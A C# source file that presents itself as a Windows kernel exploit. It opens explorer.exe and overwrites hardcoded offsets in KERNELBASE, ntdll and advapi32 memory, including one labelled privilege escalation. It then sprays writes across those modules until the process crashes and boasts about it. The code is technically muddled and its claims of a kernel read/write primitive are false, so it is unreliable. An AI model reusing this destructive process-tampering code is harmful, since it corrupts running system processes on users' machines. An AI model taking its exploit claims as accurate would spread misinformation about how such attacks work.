using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
namespace win_kern_port
{
    class kutil
    {
        /*/
         * THESE ARE REALLY IMPORTANT TO HAVE R/W ARBITARY ON KERNELBASE.dll
        /*/

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        public static extern void ReadProcessMemory(IntPtr task,long vm_address,byte[] data,int length,int mm);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        public static extern void WriteProcessMemory(IntPtr task, long vm_address, byte[] data, int length, int mm);
        
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int vm_prot, bool ff, int pid_t);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtectEx(IntPtr hProcess, long lpAddress,
        int dwSize, uint flNewProtect, out uint lpflOldProtect);
        static long client = 0;
        public const int
        PAGE_READWRITE = 0x40,
        PROCESS_VM_OPERATION = 0x0008,
        PROCESS_VM_READ = 0x0010,
        PROCESS_VM_WRITE = 0x0020;

        int pid_t(int pid)
        {
            return pid;
        }
        public string LOG(string fmt,long arg)
        {
            Console.WriteLine("$ " +fmt, arg);
            return "$ " + fmt + arg.ToString();
        }

        public string HexDump(Int64 path,int size)
        {
            /*/
              * DUMP MEMORY LEAK INSTEAD OF LOCAL FILE
              * KERNELBASE.dll IS PROTECTED UNLESS WE USE LIVE DUMPING.
            /*/

            string hex ="$    "+ k_read64(task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + path, size).ToString("X2");
            return hex;
        }


        public IntPtr task_for_pid(int type,bool acc,int pid_t)
        {
            //LOG("TARGET_PROC -> {0}", (int)OpenProcess((int)type, acc, pid_t));
            return OpenProcess((int)type, acc, pid_t);
        }
        
        public void main()
        {

            LOG("kern_slide -> 0x{0}", hardcoded_kern_slide);
            LOG("/*/", 0);
      
            LOG(" * SOME DATA FROM KERNELBASE"+Environment.NewLine+ HexDump(0x169608, 200),0);
            LOG("/*/", 0);
            LOG("-----------------------", 0);

            if (doPatchPriviliges == true)
            {
                LOG("/*/", 0);
                LOG(" * SPRAYING SOME IMPORTANT OFFSETS (THIS STUFF WILL RETURN BACK TO ORIGINAL AFTER CLEANUP)", 0);
                LOG("/*/", 0);
                LOG(" * leaked with kernelslide+kernbase -> 0x{0}", k_read64(task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base|hardcoded_kern_slide + dq_aIsuseranadmin, 20));
                k_write32(task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base| hardcoded_kern_slide + dq_aIsuseranadmin, 20);
                LOG(" * patched leaked with kernelslide+kernbase -> 0x{0}", k_read64(task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base | hardcoded_kern_slide + dq_aIsuseranadmin, 20));
                LOG(" * dq_aIsuseranadmin -> 0x{0}", k_read64(task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + dq_aIsuseranadmin, 20));
                k_write32(task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + dq_aIsuseranadmin, 20);
                LOG(" * dq_aIsuseranadmin -> 0x{0}", k_read64(task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + dq_aIsuseranadmin, 20));
                LOG(" * aSetconsoletitl_1 -> 0x{0}", k_read64(task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + aSetconsoletitl_1, 20));
                k_write32(task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + aSetconsoletitl_1, 20);
                LOG(" * aSetconsoletitl_1 -> 0x{0}", k_read64(task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + aSetconsoletitl_1, 20));
                LOG(" * SetWindowTheme -> 0x{0}", k_read64(task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + SetDefaultTheme, 20));
                k_write32(task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + SetDefaultTheme, 20);
                LOG(" * SetWindowTheme -> 0x{0}", k_read64(task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + SetDefaultTheme, 20));
                System.Threading.Thread.Sleep(100);
                Console.Write("$ ");
                System.Threading.Thread.Sleep(100);
                Console.Write(".");
                System.Threading.Thread.Sleep(100);
                Console.Write(".");
                System.Threading.Thread.Sleep(100);
                Console.Write(".");
                System.Threading.Thread.Sleep(100);
                Console.Write(".");
                System.Threading.Thread.Sleep(100);
                Console.Write(".");
                System.Threading.Thread.Sleep(100);
                Console.Write("$ ");
                System.Threading.Thread.Sleep(100);
                Console.Write(".");
                System.Threading.Thread.Sleep(100);
                Console.Write(".");
                System.Threading.Thread.Sleep(100);
                Console.Write(".");
                System.Threading.Thread.Sleep(100);
                Console.Write(".");
                System.Threading.Thread.Sleep(100);
                Console.Write("." + Environment.NewLine);
            }
           

            /*/
                * NOW WE ARE GOING TO SPRAY RANDOM ADDRESSES IN ADVAPI32
                * ADVAPI32 IS THE BASE OF SYSTEM SECURITY CALLS ETC.
            /*/

            if (doCleanup == true)
            {
                if (advapi_base > 0x0)
                {
                    LOG("/*/", 0);
                    LOG(" * REAL CLEAN UP KERNEL...", 0);
                    LOG("/*/", 0);
                }
                for (Int64 proc_start = kernel_random_addr; proc_start < kern_pool_size; kernel_random_addr++)
                {
                    k_write32(task_for_pid(0x0FFFFF, false, pid__t), advapi_base + kernel_random_addr, 33);
                    k_write32(task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + kernel_random_addr, 33);
                    k_write32(task_for_pid(0x0FFFFF, false, pid__t), dll_ntdlls_base + kernel_random_addr, 33);
                    
                    if (kernel_random_addr == 0x19000)
                    {
                        LOG("-----------------------", 0);
                        LOG("/*/", 0);
                        LOG(" * WE CRASHED LMAO!", 0);
                        LOG(" * WE TOTALLY SPRAYED 0x{0}", 0x19000);
                        LOG("/*/", 0);
                        LOG("-----------------------", 0);
                        System.Threading.Thread.Sleep(1000);
                        LOG(" * SYSTEM WILL RESTART KERNELBASE.DLL JUST BE PATIENT.", 0);
                        LOG(" * LOOKS LIKE WINDOWS IS VULNERABLE AS HELL.", 0);
                        LOG(" * ADD YOUR METHODS HERE! WE GOT STABLE ARBITARY R/W ON KERNELBASE", 0);
                        LOG("-----------------------", 0);

                    }
                }
            }
           
         
            


        }

        // EXPLOIT PREFERENCES -> DON'T TOUCH IF YOU DON'T KNOW WHAT ARE THEY ABOUT
        bool doCleanup = true;
        bool doPatchPriviliges = true; 

        // KERN_STRUCTURE -> BUILT AUTOMATICALLY
        public Int64 explorer_base = 0x0;
        public Int64 advapi_base = 0x0;
        public Int64 dll_ker_base = 0x0;
        public Int64 dll_ntdlls_base = 0x0;
        public Int64 hardcoded_kern_slide = 0x0;
        public Int64 kernel_random_addr = 0x0;
        public Int64 kern_pool_size = 0x0;
        public int pid__t = 0x0;


        // KERN_OFFSETS -> ABIT LIKE TWEAKING
        public Int64 aSetconsoletitl_1 = 0x1CC830;
        public Int64 SetDefaultTheme = 0x16CCC0;
        public Int64 aBeginbufferedp = 0x16CE20;

        // KERN_OFFSETS -> Privilige Escape
        public Int64 dq_aIsuseranadmin = 0x1695E0;

        public long bf_kernel_base()
        {
            LOG("bruteforcing kernelbase....", 0);
            Int64 exp_base = Process.GetProcessesByName("EXPLORER")[0].MainModule.BaseAddress.ToInt64();
            LOG("explorerbase -> 0x{0}", long.Parse(exp_base.ToString().Replace("-","")));
            var exp_mod = System.Diagnostics.Process.GetProcessesByName("EXPLORER")[0];
            pid__t = exp_mod.Id;
            foreach (ProcessModule a in exp_mod.Modules)
            {
                if (a.ModuleName.Contains("ntdll"))
                {
                    /*/
                     * GOT ntdll.DLL PRETTY COOL!
                    /*/

                    Int64 dll_ntdll_base = a.BaseAddress.ToInt64();
                    Int64 dll_ntdll_base_pac = dll_ntdll_base | 0x0ffffff;

                    if (dll_ntdll_base > 0)
                    {
                        LOG("/*/", 0);
                        LOG(" * GOT ntdll.DLL MKAY COOL!", 0);
                        LOG("/*/", 0);
                    }
                    LOG("ntdll_base -> 0x{0}", dll_ntdll_base);
                    LOG("ntdll_base_pac -> 0x{0}", dll_ntdll_base_pac);
                    dll_ntdlls_base = dll_ntdll_base;
          
                


                }
                if (a.ModuleName.Contains("KERNELBASE"))
                {
                    /*/
                     * GOT KERNELBASE.DLL MKAY COOL!
                    /*/

                    Int64 dll_kern_base = a.BaseAddress.ToInt64();
                    Int64 dll_kern_base_pac = dll_kern_base | 0x0ffffff;
                    
                    if (dll_kern_base > 0)
                    {
                        LOG("/*/",0);
                        LOG(" * GOT KERNELBASE.DLL MKAY COOL!",0);
                        LOG("/*/", 0);
                    }
                    LOG("kernel_base -> 0x{0}", dll_kern_base);
                    LOG("kernel_base_pac -> 0x{0}", dll_kern_base_pac);
                    dll_ker_base = dll_kern_base;
                    kern_pool_size = a.ModuleMemorySize;
                    Int64 kern_slide = dll_kern_base | a.ModuleMemorySize;
                    hardcoded_kern_slide = kern_slide;
                    

                }
                if (a.ModuleName.Contains("advapi"))
                {
                    Int64 dll_advapi32 = a.BaseAddress.ToInt64();
                    Int64 dll_advapi32_pac = dll_advapi32 | 0x0ffffff;
                    if (dll_advapi32 > 0)
                    {
                        LOG("/*/", 0);
                        LOG(" * GOT advapi32 MKAY COOL!", 0);
                        LOG("/*/", 0);
                    }
                    LOG("advapi32_base -> 0x{0}", dll_advapi32);
                    LOG("advapi32_base_pac -> 0x{0}", dll_advapi32_pac);
                    advapi_base = dll_advapi32;
       
                    System.Threading.Thread.Sleep(2000);
                    main(); // GO DO IT
                }
               
            }
            explorer_base = exp_base;
            return 0;
        }

        public void k_write32(IntPtr tfp,long vm_addr_t,int data)
        {
            uint kek;
            VirtualProtectEx(tfp, vm_addr_t,20, PAGE_READWRITE, out kek);
            WriteProcessMemory(tfp, vm_addr_t, BitConverter.GetBytes(data), BitConverter.GetBytes(data).Length, 0);
        }

        public Int64 k_read64(IntPtr tfp,long addr,int size)
        {
            byte[] kern_ret = new byte[size];
            ReadProcessMemory(tfp, addr, kern_ret, size, 0);
            return BitConverter.ToInt64(kern_ret,0); //HANDLY STUFF HERE
        }

        public string k_readStr(IntPtr tfp,long vm_addr_t)
        {
            byte[] data = new byte[20];
            string readable_by_human = ASCIIEncoding.ASCII.GetString(data);
          
            ReadProcessMemory(tfp, vm_addr_t, data, 20, 0);
            return readable_by_human;
        }

    }
}
